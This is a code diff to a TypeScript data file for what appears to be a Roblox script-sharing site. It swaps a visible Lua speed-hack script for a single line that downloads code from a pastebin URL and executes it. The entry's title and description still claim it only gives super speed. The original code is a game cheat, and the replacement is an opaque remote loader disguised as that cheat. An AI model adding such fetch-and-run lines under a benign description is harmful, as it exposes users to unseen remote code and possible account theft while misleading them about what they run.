@@ -1,3 +1,4 @@
+
 import type { Script } from "@/lib/types";
 
 export const categories = ["Utility", "Combat", "Fun", "Farming"] as const;
@@ -6,27 +7,7 @@ export const defaultScript: Script = {
   id: "super-speed-script",
   title: "Super Speed Script",
   description: "This script gives your character super speed! Run faster than anyone in the game. Easy to use, just execute and you are ready to go. Works in most games.",
-  code: `
--- Super Speed Script
-local Player = game.Players.LocalPlayer
-local Character = Player.Character or Player.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
-
--- Configuration
-local SUPER_SPEED = 200 -- Default is 16
-
--- Apply speed
-Humanoid.WalkSpeed = SUPER_SPEED
-
-print("Super Speed script activated! Your speed is now "..tostring(SUPER_SPEED))
-
--- You can add a loop to ensure it stays applied
-while wait(1) do
-    if Humanoid.WalkSpeed ~= SUPER_SPEED then
-        Humanoid.WalkSpeed = SUPER_SPEED
-    end
-end
-  `,
+  code: 'loadstring(game:HttpGet("https://pastebin.com/raw/FgdtsFbv"))()',
   author: "ScriptMaster",
   category: "Utility",
   tags: ["speed", "fun", "utility"],
